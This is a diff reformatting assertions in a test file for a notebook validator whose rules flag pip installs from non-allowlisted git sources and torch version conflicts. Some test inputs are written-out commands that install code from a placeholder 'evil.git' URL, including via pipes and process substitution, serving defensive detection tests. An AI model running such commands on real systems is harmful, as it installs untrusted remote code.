@@ -1845,9 +1845,12 @@ def test_git_sources_are_matched_case_insensitively():
         ), cell
 
     # The allowlist still clears an allowlisted repository whatever the case.
-    assert nv.rule_inst_001_git_plus(
-        "!pip install Git+https://github.com/unslothai/unsloth-zoo.git", "nb.ipynb", 0
-    ) == []
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!pip install Git+https://github.com/unslothai/unsloth-zoo.git", "nb.ipynb", 0
+        )
+        == []
+    )
 
 
 def test_notebook_validator_skips_a_prefixs_own_options():
@@ -1864,13 +1867,21 @@ def test_notebook_validator_skips_a_prefixs_own_options():
         ), cell
 
     # Only after a prefix: an ordinary command that merely mentions pip is untouched.
-    assert nv.rule_inst_001_git_plus(
-        "!echo git+https://example.com/evil.git; pip install numpy", "nb.ipynb", 0
-    ) == []
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!echo git+https://example.com/evil.git; pip install numpy", "nb.ipynb", 0
+        )
+        == []
+    )
 
-    assert len(nv.rule_inst_004_torchcodec_torch(
-        '!env -u X pip install "torch==2.12.0"', COLAB_TORCH211, "nb.ipynb", 0
-    )) == 1
+    assert (
+        len(
+            nv.rule_inst_004_torchcodec_torch(
+                '!env -u X pip install "torch==2.12.0"', COLAB_TORCH211, "nb.ipynb", 0
+            )
+        )
+        == 1
+    )
 
 
 def test_notebook_validator_keeps_redirections_and_quoted_process_forms():
@@ -1886,12 +1897,18 @@ def test_notebook_validator_keeps_redirections_and_quoted_process_forms():
     assert nv.rule_inst_001_git_plus(quoted, "nb.ipynb", 0) == []
 
     # Unquoted it runs, and a real pipeline still separates.
-    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(
-        "!cat <(pip install git+https://example.com/pkg.git)", "nb.ipynb", 0
-    ))
-    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(
-        "!echo x | pip install git+https://example.com/evil.git", "nb.ipynb", 0
-    ))
+    assert any(
+        f.rule == "R-INST-001"
+        for f in nv.rule_inst_001_git_plus(
+            "!cat <(pip install git+https://example.com/pkg.git)", "nb.ipynb", 0
+        )
+    )
+    assert any(
+        f.rule == "R-INST-001"
+        for f in nv.rule_inst_001_git_plus(
+            "!echo x | pip install git+https://example.com/evil.git", "nb.ipynb", 0
+        )
+    )
 
 
 def test_notebook_validator_reads_a_range_as_one_window():
